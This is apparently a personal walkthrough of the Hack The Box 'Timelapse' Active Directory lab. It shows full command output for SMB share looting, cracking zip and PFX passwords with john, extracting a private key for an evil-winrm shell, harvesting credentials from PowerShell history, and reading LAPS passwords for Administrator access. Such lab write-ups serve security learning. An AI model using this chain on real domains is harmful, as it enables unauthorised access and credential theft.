---
tags:
  - LAPS
  - PFX
  - powershell_history
group: ActiveDirectory
---
![](https://labs.hackthebox.com/storage/avatars/bae443f73a706fc8eebc6fb740128295.png)

- Machine : https://app.hackthebox.com/machines/Timelapse
- Reference : https://0xdf.gitlab.io/2022/08/20/htb-timelapse.html
- Solved : 2024.12.23. (Mon) (Takes 1day)

## Summary
---

1. **Initial Enumeration**
    - **Port Scanning**: Identified key open ports, including DNS (53), Kerberos (88), LDAP (389/3268), SMB (445), and WinRM (5986).
    - **DNS Enumeration**: Discovered domain `timelapse.htb` and hostname `dc01.timelapse.htb`.
    - **SMB Enumeration**: Found accessible share `Shares` and downloaded files, including `winrm_backup.zip`.
    
2. **File Analysis and Shell as `legacyy`**
    - **Cracking Zip File**:
        - Cracked `winrm_backup.zip` using `supremelegacy` to extract `legacyy_dev_auth.pfx`.
        - Cracked `legacyy_dev_auth.pfx` password (`thuglegacy`) and extracted private key and certificate.
    - **WinRM Access**:
		- Used the extracted key and certificate to gain a shell as `timelapse\legacyy`

3. **Privilege Escalation to `svc_deploy`**
	- **PowerShell History**:
	    - Discovered `svc_deploy` credentials in command history
	- **WinRM Access**:
	    - Used credentials to gain a shell as `timelapse\svc_deploy`
	
4. **Privilege Escalation to `Administrator`**
	- **LAPS Exploitation**:
	    - Leveraged `LAPS_Readers` group membership to retrieve the domain controller's local administrator password
	-  **WinRM Access**:
		- Used retrieved password to gain a shell as `timelapse\administrator`

### Key Techniques:

- **Enumeration**: Leveraged SMB shares and PowerShell history for sensitive information.
- **Credential Abuse**: Used valid credentials and certificate-based authentication for initial access and escalation.
- **LAPS Misuse**: Exploited LAPS misconfiguration to retrieve administrator credentials.

---

# Reconnaissance

### Port Scanning

```bash
┌──(kali㉿kali)-[~/htb]
└─$ ./port-scan.sh 10.10.11.152
Performing quick port scan on 10.10.11.152...
Found open ports: 53,88,135,139,389,445,464,593,636,3268,3269,5986,9389,49667,49673,49674,49695
Performing detailed scan on 10.10.11.152...
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-23 05:50 EST
Nmap scan report for 10.10.11.152
Host is up (0.13s latency).

PORT      STATE SERVICE           VERSION
53/tcp    open  domain            Simple DNS Plus
88/tcp    open  kerberos-sec      Microsoft Windows Kerberos (server time: 2024-12-23 18:50:28Z)
135/tcp   open  msrpc             Microsoft Windows RPC
139/tcp   open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp   open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ldapssl?
3268/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
3269/tcp  open  globalcatLDAPssl?
5986/tcp  open  ssl/http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
| ssl-cert: Subject: commonName=dc01.timelapse.htb
| Not valid before: 2021-10-25T14:05:29
|_Not valid after:  2022-10-25T14:25:29
| tls-alpn: 
|_  http/1.1
|_ssl-date: 2024-12-23T18:51:58+00:00; +8h00m00s from scanner time.
|_http-title: Not Found
9389/tcp  open  mc-nmf            .NET Message Framing
49667/tcp open  msrpc             Microsoft Windows RPC
49673/tcp open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc             Microsoft Windows RPC
49695/tcp open  msrpc             Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-12-23T18:51:19
|_  start_date: N/A
|_clock-skew: mean: 7h59m59s, deviation: 0s, median: 7h59m59s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 100.35 seconds
```

- Given many higher open ports, I guess that the machine is windows.
- Many windows based ports are observed : dns(53), smb(139,445)
- Some ports imply that it has to do with Active Directory based services : Kerberos(88), RPC(135), ldap(389,3268)
- Domain name is `dc01.timelapse.htb`. Let's add this to `/etc/hosts`.

### dns(53)

```bash
┌──(kali㉿kali)-[~/htb/timelapse]
└─$ dig any @10.10.11.152 timelapse.htb

; <<>> DiG 9.20.2-1-Debian <<>> any @10.10.11.152 timelapse.htb
; (1 server found)
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 2396
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 5, AUTHORITY: 0, ADDITIONAL: 3

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4000
;; QUESTION SECTION:
;timelapse.htb.                 IN      ANY

;; ANSWER SECTION:
timelapse.htb.          600     IN      A       10.10.11.152
timelapse.htb.          3600    IN      NS      dc01.timelapse.htb.
timelapse.htb.          3600    IN      SOA     dc01.timelapse.htb. hostmaster.timelapse.htb. 142 900 600 86400 3600
timelapse.htb.          600     IN      AAAA    dead:beef::b5c6:f9aa:a6a6:3e26
timelapse.htb.          600     IN      AAAA    dead:beef::24e

;; ADDITIONAL SECTION:
dc01.timelapse.htb.     3600    IN      A       10.10.11.152
dc01.timelapse.htb.     3600    IN      AAAA    dead:beef::e921:220:ed0f:d74e

;; Query time: 127 msec
;; SERVER: 10.10.11.152#53(10.10.11.152) (TCP)
;; WHEN: Thu Mar 13 05:36:57 MDT 2025
;; MSG SIZE  rcvd: 224
```

### smb(139,445)

Let's list SMB shares.

```bash
┌──(kali㉿kali)-[~/htb]
└─$ smbclient -L timelapse.htb               
Password for [WORKGROUP\kali]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        Shares          Disk      
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to timelapse.htb failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

`Shares` is unusual SMB share.
Let's see what's in it.

```bash
┌──(kali㉿kali)-[~/htb/smb_shares]
└─$ smbclient \\\\timelapse.htb\\Shares
Password for [WORKGROUP\kali]:
Try "help" to get a list of possible commands.
smb: \> prompt off
smb: \> recurse on
smb: \> mget *
getting file \Dev\winrm_backup.zip of size 2611 as Dev/winrm_backup.zip (2.8 KiloBytes/sec) (average 2.8 KiloBytes/sec)
getting file \HelpDesk\LAPS.x64.msi of size 1118208 as HelpDesk/LAPS.x64.msi (220.3 KiloBytes/sec) (average 187.0 KiloBytes/sec)
getting file \HelpDesk\LAPS_Datasheet.docx of size 104422 as HelpDesk/LAPS_Datasheet.docx (81.1 KiloBytes/sec) (average 168.3 KiloBytes/sec)
getting file \HelpDesk\LAPS_OperationsGuide.docx of size 641378 as HelpDesk/LAPS_OperationsGuide.docx (106.4 KiloBytes/sec) (average 140.3 KiloBytes/sec)
getting file \HelpDesk\LAPS_TechnicalSpecification.docx of size 72683 as HelpDesk/LAPS_TechnicalSpecification.docx (100.7 KiloBytes/sec) (average 138.2 KiloBytes/sec)

┌──(kali㉿kali)-[~/htb/smb_shares]
└─$ tree                                                    
.
├── Dev
│   └── winrm_backup.zip
└── HelpDesk
    ├── LAPS.x64.msi
    ├── LAPS_Datasheet.docx
    ├── LAPS_OperationsGuide.docx
    └── LAPS_TechnicalSpecification.docx

3 directories, 5 files
```

Two directories and their sub files are downloaded.
Let's take a look at the `Dev` directory first.


# Shell as `legacyy`

### Crack certificate

```bash
┌──(kali㉿kali)-[~/htb/smb_shares/Dev]
└─$ unzip winrm_backup.zip                             
Archive:  winrm_backup.zip
[winrm_backup.zip] legacyy_dev_auth.pfx password: 
```

I tried to `unzip` the zip file, but it has password.
Let's crack it.

```bash
┌──(kali㉿kali)-[~/htb/smb_shares/Dev]
└─$ zip2john winrm_backup.zip > winrm_backup.zip2john
ver 2.0 efh 5455 efh 7875 winrm_backup.zip/legacyy_dev_auth.pfx PKZIP Encr: TS_chk, cmplen=2405, decmplen=2555, crc=12EC5683 ts=72AA cs=72aa type=8


┌──(kali㉿kali)-[~/htb/smb_shares/Dev]
└─$ john winrm_backup.zip2john --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
supremelegacy    (winrm_backup.zip/legacyy_dev_auth.pfx)     
1g 0:00:00:00 DONE (2024-12-23 06:48) 5.263g/s 18281Kp/s 18281Kc/s 18281KC/s tabatha916..superkebab
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

With `john` I could crack the hash : `supremelegacy`
Using the credential, let's unzip the zip file.

```bash
┌──(kali㉿kali)-[~/htb/smb_shares/Dev]
└─$ unzip winrm_backup.zip 
Archive:  winrm_backup.zip
[winrm_backup.zip] legacyy_dev_auth.pfx password: 
  inflating: legacyy_dev_auth.pfx    
                                                                           
┌──(kali㉿kali)-[~/htb/smb_shares/Dev]
└─$ ls
legacyy_dev_auth.pfx  winrm_backup.zip  winrm_backup.zip2john
                                                                           
┌──(kali㉿kali)-[~/htb/smb_shares/Dev]
└─$ file legacyy_dev_auth.pfx 
legacyy_dev_auth.pfx: data
```

Given the `pfx` file, let's extract private key using `openssl`.

```bash
┌──(kali㉿kali)-[~/htb/smb_shares/Dev]
└─$ openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out legacyy_dev_auth.pem   
Enter Import Password:
```

Since it's also asking password, I need to extract hash from it.

```bash
┌──(kali㉿kali)-[~/htb/smb_shares/Dev]
└─$ pfx2john legacyy_dev_auth.pfx > legacyy_dev_auth.pfx2john
```

Then, let's crack it.

```bash
┌──(kali㉿kali)-[~/htb/smb_shares/Dev]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt legacyy_dev_auth.pfx2john 
Using default input encoding: UTF-8
Loaded 1 password hash (pfx, (.pfx, .p12) [PKCS#12 PBE (SHA1/SHA2) 128/128 ASIMD 4x])
Cost 1 (iteration count) is 2000 for all loaded hashes
Cost 2 (mac-type [1:SHA1 224:SHA224 256:SHA256 384:SHA384 512:SHA512]) is 1 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
thuglegacy       (legacyy_dev_auth.pfx)     
1g 0:00:01:24 DONE (2024-12-23 07:09) 0.01179g/s 38110p/s 38110c/s 38110C/s thyriana..thsco04
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

The cracked value is `thuglegacy`.

### Use extracted certificate and private key

Let's use this to extract `pfx`'s private key again.
(I need to set PEM pass phrase here)

```bash
┌──(kali㉿kali)-[~/htb/smb_shares/Dev]
└─$ openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out legacyy_dev_auth.key-enc
Enter Import Password:
Enter PEM pass phrase:
Verifying - Enter PEM pass phrase:
```

I successfully extract private key.
Now I have to decrypt it.

```bash
┌──(kali㉿kali)-[~/htb/smb_shares/Dev]
└─$ openssl rsa -in legacyy_dev_auth.key-enc -out legacyy_dev_auth.key
Enter pass phrase for legacyy_dev_auth.key-enc:
writing RSA key
                                                                           
┌──(kali㉿kali)-[~/htb/smb_shares/Dev]
└─$ ls
legacyy_dev_auth.key      legacyy_dev_auth.pfx       winrm_backup.zip2john
legacyy_dev_auth.key-enc  legacyy_dev_auth.pfx2john
legacyy_dev_auth.pem      winrm_backup.zip
                                                                           
┌──(kali㉿kali)-[~/htb/smb_shares/Dev]
└─$ cat legacyy_dev_auth.key    
-----BEGIN PRIVATE KEY-----
MIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQClVgejYhZHHuLz
TSOtYXHOi56zSocr9om854YDu/6qHBa4Nf8xFP6INNBNlYWvAxCvKM8aQsHpv3to
pwpQ+YbRZDu1NxyhvfNNTRXjdFQV9nIiKkowOt6gG2F+9O5gVF4PAnHPm+YYPwsb
oRkYV8QOpzIi6NMZgDCJrgISWZmUHqThybFW/7POme1gs6tiN1XFoPu1zNOYaIL3
dtZaazXcLw6IpTJRPJAWGttqyFommYrJqCzCSaWu9jG0p1hKK7mk6wvBSR8QfHW2
qX9+NbLKegCt+/jAa6u2V9lu+K3MC2NaSzOoIi5HLMjnrujRoCx3v6ZXL0KPCFzD
MEqLFJHxAgMBAAECggEAc1JeYYe5IkJY6nuTtwuQ5hBc0ZHaVr/PswOKZnBqYRzW
fAatyP5ry3WLFZKFfF0W9hXw3tBRkUkOOyDIAVMKxmKzguK+BdMIMZLjAZPSUr9j
PJFizeFCB0sR5gvReT9fm/iIidaj16WhidQEPQZ6qf3U6qSbGd5f/KhyqXn1tWnL
GNdwA0ZBYBRaURBOqEIFmpHbuWZCdis20CvzsLB+Q8LClVz4UkmPX1RTFnHTxJW0
Aos+JHMBRuLw57878BCdjL6DYYhdR4kiLlxLVbyXrP+4w8dOurRgxdYQ6iyL4UmU
Ifvrqu8aUdTykJOVv6wWaw5xxH8A31nl/hWt50vEQQKBgQDYcwQvXaezwxnzu+zJ
7BtdnN6DJVthEQ+9jquVUbZWlAI/g2MKtkKkkD9rWZAK6u3LwGmDDCUrcHQBD0h7
tykwN9JTJhuXkkiS1eS3BiAumMrnKFM+wPodXi1+4wJk3YTWKPKLXo71KbLo+5NJ
2LUmvvPDyITQjsoZoGxLDZvLFwKBgQDDjA7YHQ+S3wYk+11q9M5iRR9bBXSbUZja
8LVecW5FDH4iTqWg7xq0uYnLZ01mIswiil53+5Rch5opDzFSaHeS2XNPf/Y//TnV
1+gIb3AICcTAb4bAngau5zm6VSNpYXUjThvrLv3poXezFtCWLEBKrWOxWRP4JegI
ZnD1BfmQNwKBgEJYPtgl5Nl829+Roqrh7CFti+a29KN0D1cS/BTwzusKwwWkyB7o
btTyQf4tnbE7AViKycyZVGtUNLp+bME/Cyj0c0t5SsvS0tvvJAPVpNejjc381kdN
71xBGcDi5ED2hVj/hBikCz2qYmR3eFYSTrRpo15HgC5NFjV0rrzyluZRAoGAL7s3
QF9Plt0jhdFpixr4aZpPvgsF3Ie9VOveiZAMh4Q2Ia+q1C6pCSYk0WaEyQKDa4b0
6jqZi0B6S71un5vqXAkCEYy9kf8AqAcMl0qEQSIJSaOvc8LfBMBiIe54N1fXnOeK
/ww4ZFfKfQd7oLxqcRADvp1st2yhR7OhrN1pfl8CgYEAsJNjb8LdoSZKJZc0/F/r
c2gFFK+MMnFncM752xpEtbUrtEULAKkhVMh6mAywIUWaYvpmbHDMPDIGqV7at2+X
TTu+fiiJkAr+eTa/Sg3qLEOYgU0cSgWuZI0im3abbDtGlRt2Wga0/Igw9Ewzupc8
A5ZZvI+GsHhm0Oab7PEWlRY=
-----END PRIVATE KEY-----
```

Now I have an RSA private key file.
Plus, let's extract `certificate(crt)` file.

```bash
┌──(kali㉿kali)-[~/htb/smb_shares/Dev]
└─$ openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out legacyy_dev_auth.crt
Enter Import Password:


┌──(kali㉿kali)-[~/htb/smb_shares/Dev]
└─$ ls
legacyy_dev_auth.crt      legacyy_dev_auth.pem       winrm_backup.zip
legacyy_dev_auth.key      legacyy_dev_auth.pfx       winrm_backup.zip2john
legacyy_dev_auth.key-enc  legacyy_dev_auth.pfx2john


┌──(kali㉿kali)-[~/htb/smb_shares/Dev]
└─$ file legacyy_dev_auth.crt
legacyy_dev_auth.crt: ASCII text


┌──(kali㉿kali)-[~/htb/smb_shares/Dev]
└─$ cat legacyy_dev_auth.crt
Bag Attributes
    localKeyID: 01 00 00 00 
subject=CN=Legacyy
issuer=CN=Legacyy
-----BEGIN CERTIFICATE-----
MIIDJjCCAg6gAwIBAgIQHZmJKYrPEbtBk6HP9E4S3zANBgkqhkiG9w0BAQsFADAS
MRAwDgYDVQQDDAdMZWdhY3l5MB4XDTIxMTAyNTE0MDU1MloXDTMxMTAyNTE0MTU1
MlowEjEQMA4GA1UEAwwHTGVnYWN5eTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCC
AQoCggEBAKVWB6NiFkce4vNNI61hcc6LnrNKhyv2ibznhgO7/qocFrg1/zEU/og0
0E2Vha8DEK8ozxpCwem/e2inClD5htFkO7U3HKG9801NFeN0VBX2ciIqSjA63qAb
YX707mBUXg8Ccc+b5hg/CxuhGRhXxA6nMiLo0xmAMImuAhJZmZQepOHJsVb/s86Z
7WCzq2I3VcWg+7XM05hogvd21lprNdwvDoilMlE8kBYa22rIWiaZismoLMJJpa72
MbSnWEoruaTrC8FJHxB8dbapf341ssp6AK37+MBrq7ZX2W74rcwLY1pLM6giLkcs
yOeu6NGgLHe/plcvQo8IXMMwSosUkfECAwEAAaN4MHYwDgYDVR0PAQH/BAQDAgWg
MBMGA1UdJQQMMAoGCCsGAQUFBwMCMDAGA1UdEQQpMCegJQYKKwYBBAGCNxQCA6AX
DBVsZWdhY3l5QHRpbWVsYXBzZS5odGIwHQYDVR0OBBYEFMzZDuSvIJ6wdSv9gZYe
rC2xJVgZMA0GCSqGSIb3DQEBCwUAA4IBAQBfjvt2v94+/pb92nLIS4rna7CIKrqa
m966H8kF6t7pHZPlEDZMr17u50kvTN1D4PtlCud9SaPsokSbKNoFgX1KNX5m72F0
3KCLImh1z4ltxsc6JgOgncCqdFfX3t0Ey3R7KGx6reLtvU4FZ+nhvlXTeJ/PAXc/
fwa2rfiPsfV51WTOYEzcgpngdHJtBqmuNw3tnEKmgMqp65KYzpKTvvM1JjhI5txG
hqbdWbn2lS4wjGy3YGRZw6oM667GF13Vq2X3WHZK5NaP+5Kawd/J+Ms6riY0PDbh
nx143vIioHYMiGCnKsHdWiMrG2UWLOoeUrlUmpr069kY/nn7+zSEa2pA
-----END CERTIFICATE-----
```

Using these `legacyy_dev_auth.crt` and `legacyy_dev_auth.key` files, I can open a shell with `evil-winrm`.

```bash
┌──(kali㉿kali)-[~/htb/smb_shares/Dev]
└─$ evil-winrm -i timelapse.htb -S -k legacyy_dev_auth.key -c legacyy_dev_auth.crt

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine               

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                 

Warning: SSL enabled

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\legacyy\Documents> whoami
timelapse\legacyy
```

I got a shell as `legacyy`.


# Shell as `svc_deploy`

### Enumeration

Let's check current user.

```powershell
*Evil-WinRM* PS C:\Users\legacyy\Documents> net user legacyy
User name                    legacyy
Full Name                    Legacyy
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            10/23/2021 11:17:11 AM
Password expires             Never
Password changeable          10/24/2021 11:17:11 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   12/23/2024 12:33:59 PM

Logon hours allowed          All

Local Group Memberships      *Remote Management Use
Global Group memberships     *Domain Users         *Development
The command completed successfully.
```

The group `Remote Management Use` has to do with `evil-winrm` that I'm using now.
`Development` user might be interesting.
Let's check privileges.

```powershell
*Evil-WinRM* PS C:\Users\legacyy\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
*SeMachineAccountPrivilege*     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

No privileges are useful here.
Now, let's check Powershell command history stored in `C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`

### Powershell history

```powershell
*Evil-WinRM* PS C:\Users\legacyy\Documents> cat C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
whoami
ipconfig /all
netstat -ano |select-string LIST
$so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
$p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force
$c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)
invoke-command -computername localhost -credential $c -port 5986 -usessl -
SessionOption $so -scriptblock {whoami}
get-aduser -filter * -properties *
exit
```

It stores command lines related to password setting.
It reveals that the user `svc_deploy`'s password is set to `E3R$Q62^12p7PLlC%KWaxuaV`.

```bash
┌──(kali㉿kali)-[~/htb]
└─$ evil-winrm -i timelapse.htb -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV'

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
 
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

Warning: Press "y" to exit, press any other key to continue

Info: Exiting...

  
┌──(kali㉿kali)-[~/htb]
└─$ evil-winrm -i timelapse.htb -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV' -S

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Warning: SSL enabled

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc_deploy\Documents> whoami
timelapse\svc_deploy
```

It initially didn't work, but with `-S` option (SSL), I can open a shell.


# Shell as `Administrator`

### Enumeration

Let's check privileges.

```powershell
*Evil-WinRM* PS C:\Users\svc_deploy\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

Then, let's check user group.

```bash
*Evil-WinRM* PS C:\Users\svc_deploy\Documents> net user svc_deploy
User name                    svc_deploy
Full Name                    svc_deploy
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            10/25/2021 11:12:37 AM
Password expires             Never
Password changeable          10/26/2021 11:12:37 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   10/25/2021 11:25:53 AM

Logon hours allowed          All

Local Group Memberships      *Remote Management Use
Global Group memberships     *LAPS_Readers         *Domain Users
The command completed successfully.
```

The user `svc_deploy` belongs to `LAPS_Readers` group.

For the background,
With LAPS, the DC manages the local administrator passwords for computers on the domain. It is common to create a group of users and give them permissions to read these passwords, allowing the trusted administrators access to all the local admin passwords.

In the domain's computer objects, the implementation of LAPS results in the addition of two new attributes: **ms-mcs-AdmPwd** and **ms-mcs-AdmPwdExpirationTime**. These attributes store the **plain-text administrator password** and **its expiration time**, respectively.

```bash
*Evil-WinRM* PS C:\Users\svc_deploy\Documents> Get-ADComputer DC01 -property 'ms-mcs-admpwd'


DistinguishedName : CN=DC01,OU=Domain Controllers,DC=timelapse,DC=htb
DNSHostName       : dc01.timelapse.htb
Enabled           : True
ms-mcs-admpwd     : ]MTq4Y2L0t[htP@[;+5cSQO7
Name              : DC01
ObjectClass       : computer
ObjectGUID        : 6e10b102-6936-41aa-bb98-bed624c9b98f
SamAccountName    : DC01$
SID               : S-1-5-21-671920749-559770252-3318990721-1000
UserPrincipalName :
```

Based on the result, `Administrator`'s password is `]MTq4Y2L0t[htP@[;+5cSQO7`.

```bash
┌──(kali㉿kali)-[~/htb]
└─$ evil-winrm -i timelapse.htb -u 'Administrator' -p ']MTq4Y2L0t[htP@[;+5cSQO7' -S
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Warning: SSL enabled
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
timelapse\administrator
```

I got a root shell!